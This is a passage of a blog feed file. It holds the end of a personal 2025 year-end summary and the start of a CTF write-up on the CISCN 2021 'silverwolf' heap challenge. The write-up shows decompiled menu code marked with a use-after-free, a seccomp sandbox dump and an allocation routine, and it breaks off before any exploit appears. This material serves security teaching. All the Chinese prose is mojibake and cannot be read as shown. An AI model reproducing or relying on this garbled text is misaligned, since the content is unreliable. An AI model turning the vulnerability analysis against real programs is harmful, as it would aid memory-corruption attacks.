class><p>å’³å’³ï¼Œå€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæˆ‘é¬¼è°·å­æœ‰æ ‡äº†ï¼Œè™½ç„¶å¹¶ä¸å¼º</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-03-27-09-47-50-228_com.tencent.tmgp.sgame.jpg" class><p>æˆ‘ä¹Ÿå°è¯•åŠ å…¥è”åˆæˆ˜é˜Ÿï¼Œä½†æ˜¯ä¸€ä¸ªéƒ½ä¸è¦æˆ‘ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªæ¯”è¾ƒæ‚²ä¼¤çš„æ•…äº‹äº†ã€‚</p><p>xmä¹ŸæŠ•è¿‡å¾ˆå¤šæ¬¡ï¼Œå¯¼è‡´æˆ‘åé¢éƒ½ä¸æ€ä¹ˆæ„¿æ„æŠ•äº†(æœ‰ç‚¹å¤±æœ›ï¼Œä¹Ÿå¯èƒ½æ˜¯æˆ‘è‡ªå·±ä¸äº‰æ°” qwq)</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-04-14-21-46-51-210_com.tencent.mobileqq.jpg" class><p>åé¢å‚åŠ äº†æŒ¯å…´æ¯ï¼Œæ‹¿åˆ°äº†æˆ‘ç¬¬ä¸€ä¸ªå¥–æ¯ è™½ç„¶æ˜¯æ°´è¿‡æ¥çš„ä¸‰ç­‰å¥–</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251127_170342.jpg" class><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251127_174209.jpg" class><p>ç„¶åæ¥è§¦äº†<code>Archlinux</code>, <code>linux</code>çš„ä½¿ç”¨ä½“éªŒçœŸçš„ç¢¾å‹Windowsï¼Œå¦‚æœå­¦ä¹ èƒ½åŠ›æ¯”è¾ƒå¼ºï¼Œä½“éªŒè‡ªç„¶æ˜¯æå¥½çš„ï¼Œå½“ç„¶æˆ‘ä¸ç®—ï¼Œæ‰€ä»¥æˆ‘ç”¨èµ·æ¥ï¼Œç—›å¹¶å¿«ä¹ç€ï¼Œè¿™ä¸¤å¼ æ˜¯KDEçš„</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE_20250628_213440.png" class title="å±å¹•æˆªå›¾_20250628_213440"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/wallpaper.png" class title="wallpaper"><p>è¿™å¼ å…¶å®æ˜¯windowsçš„</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Screenshot_2025-09-29-10-28-54-501_youqu.android.todesk.jpg" class title="Screenshot_2025-09-29-10-28-54-501_youqu.android.todesk"><p>å†™åˆ°è¿™é‡Œçš„æ—¶å€™ï¼Œçªç„¶å‘ç°æˆ‘çš„hyprlandè¿˜æ²¡æœ‰ä¸€å¼ æˆªå›¾ï¼Œè¿™ä¸å¾—å½“å³æ¥ä¸€å¼  å“ˆå“ˆå“ˆå“ˆ <img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/260103_00h30m09s_screenshot.png" class title="260103_00h30m09s_screenshot"></p><p>æˆ‘è‡ªç„¶æ˜¯åšäº†ä¸€äº›å¾®è°ƒï¼Œä¸è¿‡æˆ‘ä¸ªäººè¿˜æ˜¯æ„Ÿè§‰å¾ˆæ£’å°±æ˜¯äº†ï¼Œ</p><p>Emm,å€¼å¾—ä¸€æçš„æ˜¯<code>æ°´c</code>çœŸçš„æ˜¯æˆ‘æ‰“è¿‡æœ€çƒ‚çš„æ¯”èµ›ï¼Œ<code>pyä¹‹é£</code>ç››è¡Œï¼Œå¹¶ä¸”æœåŠ¡å™¨æ‰“ä¸‰å¤©ï¼Œæœ‰ä¸€å¤©åŠæ˜¯è¿›ä¸å»çš„ï¼Œå·¨çƒ‚ï¼Œ</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/Image_1748403959929075.png" class title="Image_1748403959929075"><p>æ¥ä¸‹æ¥åº”è¯¥æ²¡ä»€ä¹ˆäº†ï¼Œä¸€äº›å›¾ç‰‡&lt;å¥½å¥½çš„ä¸€ä¸ªå¹´ç»ˆæ€»ç»“ç»™æˆ‘å†™æˆäº†å›¾åºŠ qwq&gt;</p><p>é€ä½ ä¸€æœµå°èŠ±èŠ±</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250401_195436.jpg" class title="IMG_20250401_195436"><p>æ¥çˆ¬æ­¦åŠŸå±±</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_195939.jpg" class title="IMG_20250403_195939"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_204059.jpg" class title="IMG_20250403_204059"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_204214.jpg" class title="IMG_20250403_204214"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250403_221231.jpg" class title="IMG_20250403_221231"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250404_062622.jpg" class title="IMG_20250404_062622"><p>æ¬åˆ°æ–°å¯å®¤ï¼Œç¨å¾®å¸ƒç½®ä¸€ä¸‹ï¼Œä¸è¿‡ç¯å¸¦ä¹°äº®äº†ï¼Œç„¶åå°è¯•æ‹¿çº¸å¸¦æŒ¡ä¸€ä¸‹å…‰ï¼Œåé¢å¤±è´¥äº†</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250911_211937.jpg" class title="IMG_20250911_211937"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250916_180104.jpg" class title="IMG_20250916_180104"><p>ç„¶åå°±æ˜¯ä¸€äº›ä¸æ˜æ‰€ä»¥çš„é£æ™¯å›¾<img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250720_173131.jpg" class title="IMG_20250720_173131"></p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250721_190515.jpg" class title="IMG_20250721_190515"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250814_183146.jpg" class title="IMG_20250814_183146"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250917_173714.jpg" class title="IMG_20250917_173714"><p>å»é•¿æ²™ç©</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_101024.jpg" class title="IMG_20251022_101024"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_101209.jpg" class title="IMG_20251022_101209"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_103741.jpg" class title="IMG_20251022_103741"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_110525.jpg" class title="IMG_20251022_110525"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_112117.jpg" class title="IMG_20251022_112117"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_115935.jpg" class title="IMG_20251022_115935"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_122836.jpg" class title="IMG_20251022_122836"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_184927.jpg" class title="IMG_20251022_184927"><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼Œå¡”ç½—çœŸçš„èµšé’±ï¼Œæ¯”æˆ‘ä»¬æ¢…èŠ±ï¼Œå…­çˆ»æˆ–è€…å¤§å…­å£¬èµšé’±å¤šäº†ï¼Œæ‰€ä»¥ç­‰ä»¥åæ··ä¸ä¸‹å»äº†ï¼Œå°±å»æ‘†å¡”ç½—æ‘Šå­éª—é’±</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_191453.jpg" class title="IMG_20251022_191453"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251022_225456.jpg" class title="IMG_20251022_225456"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_113018.jpg" class title="IMG_20251023_113018"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_113205.jpg" class title="IMG_20251023_113205"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20251023_145908.jpg" class title="IMG_20251023_145908"><p>å½“ç„¶ä¹Ÿé‡åˆ°äº†ä¸€äº›ï¼Œè®©äººåŒçƒ¦çš„ ï¼Œexäººçš„å­˜åœ¨ï¼Œå¯èƒ½æˆ‘çš„ä¸€äº›åšæ³•ä¼¤åˆ°äº†è¿™ä½ç»ç’ƒå¿ƒå°‘çˆ·äº†å§</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/sb.png" class title="sb"><p>æˆ‘ä¸€ä¸ªäººå¸®motheråŠˆå®Œäº†å®¶é‡Œçš„æŸ´ å“‡å“ˆå“ˆå“ˆ</p><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250207_103946.jpg" class title="IMG_20250207_103946"><img src="/2026/01/03/college/2026-01-03-2025%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/Export/IMG_20250207_163709.jpg" class title="IMG_20250207_163709"><p>å…¶ä»–è²Œä¼¼ä¹Ÿæ²¡æœ‰ä»€ä¹ˆäº†ï¼Œæ‰€ä»¥ï¼Œåˆ°äº†ï¼Œç»“å°¾</p><h1 id="ç»“å°¾"><a href="#ç»“å°¾" class="headerlink" title="ç»“å°¾"></a>ç»“å°¾</h1><p>25å¹´ï¼Œå­¦ä¹ å¼ºåº¦å…¶å®å¹¶ä¸å¤§ï¼Œå¿ƒæ€æœ‰ç‚¹æ”¾æ¾äº†ï¼Œä¹Ÿè¢«å¾ˆå¤šçäº‹æ‰€å½±å“äº†ï¼Œå¸Œæœ›æˆ‘26å¹´èƒ½å¤Ÿæˆä¸ºpwnğŸˆ¸ï¼Œå­¦å®Œæ‰€æœ‰çš„ä¸œè¥¿ï¼Œç„¶åé€šæ€å¤§èµ›çš„pwn &lt;å“ˆå“ˆå“ˆå“ˆï¼Œè™½ç„¶ æˆ‘çŸ¥é“è¿™ä¸å¯èƒ½&gt; </p><p>é‚£ä¹ˆå°±å°è¯•å­¦å®Œæ‰€æœ‰å¿…é¡»çš„ï¼Œå¹¶ä¸”åœ¨æ­¤åŸºç¡€ä¸Šæ‹“å±•ï¼Œåœ¨å¤§èµ›ä¸­å–å¾—å¥½åæ¬¡å§ï¼Œ&lt;æ®è¯´ï¼Œç½‘é¼åœ¨ä»Šå¹´ä¼šå¼€&gt;</p><p>ä¹Ÿæ˜¯æ‹–åˆ°äº†2026-1-2æ‰å†™å®Œçš„ï¼Œ æˆ‘çš„æ‹–å»¶ç—‡æ˜‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚ã€‚</p><p>â€‹â€”â€”â€“ æ˜¾è®°äºå°å°æª</p>]]></content>
      
      
      <categories>
          
          <category> çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
            <tag> çŸ¥è¯†æ€»ç»“ </tag>
            
            <tag> æŠ€æœ¯ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ğŸ“š CISCN_2021_åˆèµ›_silverwolf</title>
      <link href="/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/"/>
      <url>/2025/11/21/writeup/2025-11-21-CISCN_2021_%E5%88%9D%E8%B5%9B_silverwolf/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2021-åˆèµ›-silverwolf-â€”-å †ä¸Šçš„ORW"><a href="#CISCN-2021-åˆèµ›-silverwolf-â€”-å †ä¸Šçš„ORW" class="headerlink" title="[CISCN 2021 åˆèµ›]silverwolf â€”- å †ä¸Šçš„ORW"></a>[CISCN 2021 åˆèµ›]silverwolf â€”- å †ä¸Šçš„ORW</h1><p>å°è¯•å¤ç°ä¸€äº›å¤§èµ›çš„é¢˜ç›®ï¼Œä¸»è¦æ˜¯æ„Ÿè§‰ä¸€ç‚¹é•¿è¿›éƒ½æ²¡æœ‰ï¼Œä¸€ç›´åˆ·é¢˜ä¸çŸ¥é“å­¦äº†äº›ä»€ä¹ˆâ€¦â€¦</p><p>è¿™é¢˜ä¸»è¦æ˜¯å †ä¸Šçš„ORW,è·Ÿç€getsçš„<a href="http://www.getspwn.xyz/?p=43">åšå®¢</a>æ¥çš„</p><p>åºŸè¯ä¸å¤šè¯´ï¼Œå¼€å§‹ï¼Œpwninitä¸€ä¸‹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">â¯ pwninit pwn</span><br><span class="line">[INFO] å½“å‰å·²åœ¨è™šæ‹Ÿç¯å¢ƒä¸­: ctf</span><br><span class="line">[INFO] ç»™äºŒè¿›åˆ¶æ–‡ä»¶æ·»åŠ æ‰§è¡Œæƒé™...</span><br><span class="line">[SUCCESS] æƒé™æ·»åŠ æˆåŠŸ: pwn</span><br><span class="line">[INFO] æ£€æŸ¥äºŒè¿›åˆ¶æ–‡ä»¶ä¿æŠ¤:</span><br><span class="line">==================================</span><br><span class="line">[*] &#x27;/mnt/d/TY/ç½‘å®‰ç¬”è®°/CTF_PWN/å¤ç°/CISCN_2021_åˆèµ›_silverwolf/pwn&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    FORTIFY:    Enabled</span><br><span class="line">==================================</span><br><span class="line">[INFO] ç”Ÿæˆexp.pyæ¨¡æ¿...</span><br><span class="line">[SUCCESS] exp.pyç”ŸæˆæˆåŠŸ</span><br><span class="line">[SUCCESS] åˆå§‹åŒ–å®Œæˆï¼</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ä¿æŠ¤å…¨å¼€ï¼Œç¨å¾®è¿è¡Œäº†ä¸€ä¸‹ï¼ŒåŸºæœ¬çš„èœå•é¢˜ï¼Œæ‹–idaçœ‹çœ‹ </p><h2 id="ç¨‹åº"><a href="#ç¨‹åº" class="headerlink" title="ç¨‹åº"></a>ç¨‹åº</h2><h3 id="main"><a href="#main" class="headerlink" title="main"></a>main</h3><p>æˆ‘å°†å‡½æ•°ç¨å¾®é‡å‘½åäº†ä¸€ä¸‹ï¼Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3[<span class="number">5</span>]; <span class="comment">// [rsp+0h] [rbp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v3[<span class="number">1</span>] = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. allocate&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. edit&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. show&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;4. delete&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;5. exit&quot;</span>);</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Your choice: &quot;</span>);</span><br><span class="line">    __isoc99_scanf(&amp;unk_1144, v3);</span><br><span class="line">    <span class="keyword">switch</span> ( v3[<span class="number">0</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1LL</span>:</span><br><span class="line">        add();                                  <span class="comment">// malloc chunk_size &lt;= 0x78</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2LL</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3LL</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4LL</span>:</span><br><span class="line">        delete();                               <span class="comment">// UAF</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5LL</span>:</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Unknown&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="init"><a href="#init" class="headerlink" title="init_"></a>init_</h3><p>å­˜åœ¨æ²™ç›’</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">init_</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  v0 = seccomp_init(<span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">0LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">2LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  seccomp_rule_add(v0, <span class="number">2147418112LL</span>, <span class="number">1LL</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">return</span> seccomp_load(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//seccomp-tools dump ./pwn   åªç»™äº†read open writeï¼Œå¾ˆæ˜æ˜¾æ‰“å †ä¸Šçš„ORW</span></span><br><span class="line">â¯ seccomp-tools dump ./pwn</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x07</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x04</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">if</span> (A == read) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x00000001</span>  <span class="keyword">if</span> (A == write) <span class="keyword">goto</span> <span class="number">0008</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x00000002</span>  <span class="keyword">if</span> (A != open) <span class="keyword">goto</span> <span class="number">0009</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure><h3 id="add"><a href="#add" class="headerlink" title="add"></a>add</h3><p>è¿™é‡Œæ˜¯å­˜åœ¨ä¸€äº›é—®é¢˜çš„ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œç¨‹åºåœ¨è¾“å…¥indexä¹‹åä¼šæœ‰ä¸€ä¸ª**!size**çš„åˆ¤æ–­ï¼Œæ‰€ä»¥indexä¸€å®šå¾—ä¸º0ï¼Œä¹Ÿå°±ç®—æ˜¯è¯´ï¼Œåé¢ç”³è¯·çš„chunkä¼šæŠŠå‰é¢ç”³è¯·çš„chunkå µç›–æ‰ï¼ŒåŒæ—¶é™åˆ¶mallocçš„chunkå¤§å°å¾—å°äºç­‰äº0x78</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> chunk_size; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> size; <span class="comment">// [rsp+0h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;size);</span><br><span class="line">  <span class="keyword">if</span> ( !size )</span><br><span class="line">  &#123;</span><br><span class="line">    __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">    __isoc99_scanf((__int64)&amp;unk_1144, (__int64)&amp;size);</span><br><span class="line">    chunk_size = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x78</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_chk(<span class="number">1LL</span>, <span class="string">&quot;Too large&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      ptr = <span class="built_in">malloc</span>(size);</span><br><span class="line">      <span class="keyword">if</span> ( ptr )</span><br><span class="line">      &#123;</span><br><span class="line">        size_list = chunk_size;</span><br><span class="line">        heap_list = ptr;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;allocate failed&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28u</span>) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="edit"><a href="#edit" class="headerlink" title="edit"></a>edit</h3><p>åŒæ—¶editä¹Ÿæ˜¯åŒæ ·çš„ï¼Œæœ‰ä¸€ä¸ªåˆ¤æ–­ï¼Œv3å¾—ä¸º0ï¼Œä¹Ÿå°±æ˜¯åªèƒ½ä¿®æ”¹ç¬¬ä¸€ä¸ªchunkï¼Œå¹¶ä¸”å…è®¸æˆ‘ä»¬å¾€chunké‡Œé¢è¯»å–å†…å®¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span 